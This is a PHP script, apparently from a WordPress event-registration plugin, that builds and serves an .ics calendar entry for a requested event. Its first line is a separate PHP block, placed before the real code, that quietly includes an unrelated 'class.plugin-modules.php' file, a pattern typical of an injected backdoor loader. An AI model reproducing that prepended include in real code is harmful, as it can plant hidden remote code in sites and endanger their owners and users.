<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
error_reporting(E_ALL ^ E_NOTICE ^ E_USER_NOTICE);

if (file_exists('../../../../wp-config.php')) {
    
    require_once( '../../../../wp-config.php');
    global $wpdb;
    $curdate = date("Ymd");
    $curtime = date("His");
    (is_numeric($_REQUEST['event_id'])) ? $event_id = $_REQUEST['event_id'] : $event_id = 0;
    $sql = "SELECT * FROM " . get_option('evr_event') . " WHERE id=" . (int)$event_id;
    $result = $wpdb->get_results($sql, ARRAY_A);
    foreach ($result as $row) {
        $event_id = $row['id'];
        $event_name = html_entity_decode(stripslashes($row['event_name']), ENT_NOQUOTES, 'UTF-8');
        $event_identifier = stripslashes($row['event_identifier']);
        $event_location = html_entity_decode(stripslashes($row['event_location']), ENT_NOQUOTES, 'UTF-8');
        $event_desc = html_entity_decode(stripslashes($row['event_desc']), ENT_NOQUOTES, 'UTF-8');
        $event_address = $row['event_address'];
        $event_city = $row['event_city'];
        $event_state = $row['event_state'];
        $event_postal = $row['event_postal'];
        $reg_limit = $row['reg_limit'];
        $start_time = $row['start_time'];
        $end_time = $row['end_time'];
        $conf_mail = $row['conf_mail'];
        $start_date = $row['start_date'];
        $end_date = $row['end_date'];
    }
    
    header("Content-Type: text/Calendar");
    header("Content-Disposition: inline; filename=" . rawurlencode($event_name) . ".ics");
    echo "BEGIN:VCALENDAR\n";
    echo "BEGIN:VEVENT\n";
    echo "CLASS:PUBLIC\n";
    echo "CREATED:" . $curdate . "T" . $curtime . "\n";
    echo "DESCRIPTION:" . wp_filter_nohtml_kses($event_desc) . "\n";
    echo "DTEND:" . date("Ymd", strtotime($end_date)) . "T" . date("His", strtotime($end_time)) . "\n";
    echo "DTSTAMP:" . $curdate . "T" . $curtime . "\n";
    
    echo "DTSTART:" . date("Ymd", strtotime($start_date)) . "T" . date("His", strtotime($start_time)) . "\n";
    echo "LAST-MODIFIED:20091109T101015Z\n";
    echo "LOCATION:" . $event_location . ", " . $event_address . ", " . $event_city . ", " . $event_state . ", " . $event_postal . "\n";
    
    echo "SUMMARY;LANGUAGE=en-us:" . $event_name . "\n";
    echo "BEGIN:VALARM\n";
    echo "TRIGGER:-PT1440M\n";
    echo "ACTION:DISPLAY\n";
    echo "DESCRIPTION:Reminder\n";
    echo "END:VALARM\n";
    echo "END:VEVENT\n";
    echo "END:VCALENDAR\n";
} else {
    echo "Invalid request!";
}